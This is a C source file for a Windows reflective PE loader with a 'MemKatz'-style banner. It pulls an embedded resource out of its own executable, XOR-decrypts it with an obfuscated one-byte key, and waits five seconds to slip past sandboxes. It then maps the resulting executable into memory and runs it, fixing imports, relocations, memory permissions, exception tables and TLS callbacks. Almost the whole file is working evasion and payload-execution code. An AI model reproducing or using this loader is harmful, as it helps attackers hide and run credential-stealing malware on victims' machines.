#include <stdio.h>
#include <Windows.h>
#include "resource.h"
#include "structs.h"

DWORD	g_DelayTime			=	5000;		// Wait five seconds before executing
BOOL	g_Verbose			=	FALSE;		// TRUE = verbose output (use for debugging)
BOOL	g_PrintBanner 			= 	TRUE; 		// TRUE = print banner

VOID PrintBanner(VOID) {

printf("\n");
printf("ooo        ooooo                             oooo    oooo               .              \n");
printf("`88.       .888'                             `888   .8P'              .o8			   \n");
printf(" 888b     d'888   .ooooo.  ooo. .oo.  .oo.    888  d8'     .oooo.   .o888oo   oooooooo \n");
printf(" 8 Y88. .P  888  d88' `88b `888P\"Y88bP\"Y88b   88888[      `P  )88b    888    d'\"\"7d  \n");
printf(" 8  `888'   888  888ooo888  888   888   888   888`88b.     .oP\"888    888      .d8P'   \n");
printf(" 8    Y     888  888    .o  888   888   888   888  `88b.  d8(  888    888 .  .d8P'	    \n");
printf("o8o        o888o `Y8bod8P' o888o o888o o888o o888o  o888o `Y888\"\"8o   \"888\" d8888888P \n\n"); 
}

BOOL FetchRsrc(IN CONST DWORD dwResourceId, OUT PBYTE* ppBuffer, OUT PSIZE_T sLength) {
    
        HRSRC       hRsrc        =      NULL;
        HGLOBAL     hGlobal      =      NULL;
        PVOID       pBaseAddr    =      NULL;
        HMODULE     hModule      =      GetModuleHandleW(NULL);

    if (!(hRsrc = FindResourceW(hModule, MAKEINTRESOURCEW(dwResourceId), RT_RCDATA))) {
        if (g_Verbose)
            printf("[!] Unable to find resource! Error: %d \n", GetLastError());
        return FALSE;
    }

    if (!(hGlobal = LoadResource(hModule, hRsrc))) {
        if (g_Verbose)
            printf("[!] Unable to load resource! Error: %d \n", GetLastError());
        return FALSE;
    }

    if (!(pBaseAddr = LockResource(hGlobal))) {
        if (g_Verbose)
            printf("[!] Failed to lock resource! Error: %d \n", GetLastError());
        return FALSE;
    }

    if (!(*sLength = (SIZE_T)SizeofResource(hModule, hRsrc))) {
        if (g_Verbose)
            printf("[!] Unable to calculate resource size! Error: %d \n", GetLastError());
        return FALSE;
    }

    if (!(*ppBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *sLength))) {
        if (g_Verbose)
            printf("[!] Resource could not be written to memory! Error: %d \n", GetLastError());
        return FALSE;
    }

    RtlCopyMemory(*ppBuffer, pBaseAddr, *sLength);

    return (*ppBuffer && *sLength) ? TRUE : FALSE;
}


BOOL DecryptRsrc(IN PBYTE pEncryptedBuf, IN SIZE_T sEncrypedBufLength, IN BYTE bXorKey) {

	if (!pEncryptedBuf || !sEncrypedBufLength) {
		if (g_Verbose)
			printf("Decryption failed! Error: %d \n", GetLastError());
		return FALSE;
	}

	for (size_t i = 0; i < sEncrypedBufLength; i++) {
		pEncryptedBuf[i] ^= bXorKey;
	}

	return TRUE;
}


BOOL RunPe(IN ULONG_PTR uPeFileBuffer, IN SIZE_T sPeFileSize) {

			ULONG_PTR						uBaseAdddress		 =	NULL,
											uDeltaOffset		 =	NULL;
			PIMAGE_NT_HEADERS				pImgNtHdrs			 =	NULL;
			PIMAGE_SECTION_HEADER			pImgSectionHdr		 =	NULL;
			PIMAGE_DATA_DIRECTORY			pTmpDataDir			 =	NULL;
			PIMAGE_IMPORT_DESCRIPTOR		pImgDescriptor		 =	NULL;
			PIMAGE_BASE_RELOCATION			pImgBaseRelocation	 =	NULL;
			PBASE_RELOCATION_ENTRY			pBaseRelocEntry		 =	NULL;
			PIMAGE_EXPORT_DIRECTORY			pImgExportDir		 =	NULL;
			PIMAGE_RUNTIME_FUNCTION_ENTRY	pImgRuntimeFuncEntry =	NULL;
			PIMAGE_TLS_DIRECTORY			pImgTlsDirectory	 =	NULL;
			PIMAGE_TLS_CALLBACK*			ppImgTlsCallback	 =	NULL;
			CONTEXT							ThreadCtx			 = { 0 };

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPeFileBuffer + ((PIMAGE_DOS_HEADER)uPeFileBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	/*---- Allocate Memory ----*/
	if (!(uBaseAdddress = VirtualAlloc(NULL, pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		if (g_Verbose)
			printf("[!] Failed to allocate memory for PE! Error: %d \n", GetLastError());
		return FALSE;
	}

	if (g_Verbose) {
		printf("[>] Allocated Image Base Address: 0x%p\n", (LPVOID)uBaseAdddress);
		printf("[>] Preferred Base Address: 0x%p\n", (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase);
	}

	/*---- Write PE Sections ----*/
	pImgSectionHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	if (g_Verbose)
		printf("[>] Writing PE Sections...\n");
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		if (g_Verbose)
			printf("\t[+] Writing Section %s At %p Of Size %d \n", pImgSectionHdr[i].Name, (void*)(uBaseAdddress + pImgSectionHdr[i].VirtualAddress), (int)pImgSectionHdr[i].SizeOfRawData);
		RtlCopyMemory((PVOID)(uBaseAdddress + pImgSectionHdr[i].VirtualAddress), (PVOID)(uPeFileBuffer + pImgSectionHdr[i].PointerToRawData), pImgSectionHdr[i].SizeOfRawData);
	}

	/*---- Fix IAT ----*/
	if (g_Verbose)
		printf("[>] Fixing The Import Address Table.\n");

	pTmpDataDir = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	for (SIZE_T i = 0; i < pTmpDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(uBaseAdddress + pTmpDataDir->VirtualAddress + i);
		if (pImgDescriptor->OriginalFirstThunk == NULL && pImgDescriptor->FirstThunk == NULL)
			break;

		LPSTR				cDllName			=	(LPSTR)(uBaseAdddress + pImgDescriptor->Name);
		ULONG_PTR			uOrigFirstThunkRVA  =   pImgDescriptor->OriginalFirstThunk;
		ULONG_PTR			uFirstThunkRVA		=	pImgDescriptor->FirstThunk;
		SIZE_T				ImgThunkSize		=	0x00;
		HMODULE				hModule				=	NULL;

		if (!(hModule = LoadLibraryA(cDllName))) {
			if (g_Verbose)
				printf("[!] Unable to load Dll! Error: %d \n", GetLastError());
			return FALSE;
		}

		while (TRUE) {

			PIMAGE_THUNK_DATA			pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(uBaseAdddress + uOrigFirstThunkRVA + ImgThunkSize),
												pFirstThunk = (PIMAGE_THUNK_DATA)(uBaseAdddress + uFirstThunkRVA + ImgThunkSize);

			PIMAGE_IMPORT_BY_NAME		pImgImportByName	= NULL;
			ULONG_PTR					pFuncAddress		= NULL;

			if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)))) {
					if (g_Verbose)
						printf("[!] Could Not Import !%s#%d \n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			else {
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(uBaseAdddress + pOriginalFirstThunk->u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name))) {
					if (g_Verbose)
						printf("[!] Could Not Import !%s.%s \n", cDllName, pImgImportByName->Name);
					return FALSE;
				}
			}

			pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;
			ImgThunkSize += sizeof(IMAGE_THUNK_DATA);
		}
	}

	/*---- Fix Relocations ----*/
	if (g_Verbose)
		printf("[>] Fixing PE Relocations.\n");

	pTmpDataDir			=	&pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pImgBaseRelocation	=	uBaseAdddress + pTmpDataDir->VirtualAddress;
	uDeltaOffset		=	uBaseAdddress - pImgNtHdrs->OptionalHeader.ImageBase;

	while (pImgBaseRelocation->VirtualAddress) {

		pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {
			switch (pBaseRelocEntry->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += uDeltaOffset;
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += (DWORD)uDeltaOffset;
				break;
			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += HIWORD(uDeltaOffset);
				break;
			case IMAGE_REL_BASED_LOW:
				*((WORD*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += LOWORD(uDeltaOffset);
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			default:
				printf("[!] Unknown relocation type: %d | Offset: 0x%08X \n", pBaseRelocEntry->Type, pBaseRelocEntry->Offset);
				return FALSE;
			}

			pBaseRelocEntry++;
		}

		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
	}

	/*---- Fix Memory Permissions ----*/
	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

			DWORD	dwProtection	 = 0x00,
					dwOldProtection  = 0x00;

		if (!pImgSectionHdr[i].SizeOfRawData || !pImgSectionHdr[i].VirtualAddress)
			continue;

		if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READ;

		if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		if (!VirtualProtect((PVOID)(uBaseAdddress + pImgSectionHdr[i].VirtualAddress), pImgSectionHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
			if (g_Verbose)
				printf("[!] Failed to set memory permission on section [%s] | Error: %d \n", pImgSectionHdr[i].Name, GetLastError());
			return FALSE;
		}
	}

	if (g_Verbose)
		printf("[>] Set Memory Permissions For Each PE Section. \n");

	/*---- Register Exception Handlers ----*/
	pTmpDataDir = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (pTmpDataDir->Size) {

		pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(uBaseAdddress + pTmpDataDir->VirtualAddress);

		if (!RtlAddFunctionTable(pImgRuntimeFuncEntry, (pTmpDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), uBaseAdddress)) {
			if (g_Verbose)
				printf("[!] Exception Handlers could not be registered! Error: %d \n", GetLastError());
			return FALSE;
		}
		if (g_Verbose)
			printf("[>] Registered Exception Handlers.\n");
	}

	/*---- Execute TLS (Thread Local Storage) Callbacks ----*/
	pTmpDataDir = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (pTmpDataDir->Size) {
		pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(uBaseAdddress + pTmpDataDir->VirtualAddress);
		ppImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);

		for (int i = 0; ppImgTlsCallback[i] != NULL; i++)
			ppImgTlsCallback[i]((LPVOID)uBaseAdddress, DLL_PROCESS_ATTACH, &ThreadCtx);
		if (g_Verbose)
			printf("[>] Executed TLS Callback Functions.\n");
	}

	/*---- Execute PE Entry Point -----*/
	if (pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) {

		BOOL(WINAPI* pDllMainFunc)(HINSTANCE, DWORD, LPVOID) = uBaseAdddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
		HANDLE		hThread = NULL;
		
		if (g_Verbose)
			printf("[>] Executing DllMain.\n");
		pDllMainFunc((HINSTANCE)uBaseAdddress, DLL_PROCESS_ATTACH, NULL);

	}
	else {
		if (g_Verbose)
			printf("[>] Executing Main.\n");

		BOOL(WINAPI* pMainFunc)(VOID) = uBaseAdddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
		return pMainFunc();
	}

	return TRUE;
}

BOOL DelayExecution(IN DWORD dwMilliseconds) {

	ULONGLONG	t0		=	GetTickCount64();
	HANDLE		hEvent  =	CreateEventW(NULL, FALSE, FALSE, NULL);

	if (!hEvent) {
		return FALSE;
	}
	if (WaitForSingleObject(hEvent, dwMilliseconds) == WAIT_FAILED) {
		CloseHandle(hEvent);
		return FALSE;
	}
	CloseHandle(hEvent);
	return (GetTickCount64() - t0) >= dwMilliseconds;
}

int main() {

	PBYTE	buf = NULL;
	SIZE_T  len = 0;

	if (g_PrintBanner)
		PrintBanner();

	if (!DelayExecution(g_DelayTime))
		return -1;

	if (!FetchRsrc(FACILITY_BLUETOOTH_ATT, &buf, &len))
		return -1;

	if (!DecryptRsrc(buf, len, FILE_ATTRIBUTE_READONLY))
		return -1;
	
	if (!RunPe((ULONG_PTR)buf, len))
		return -1;

	return 0;
}
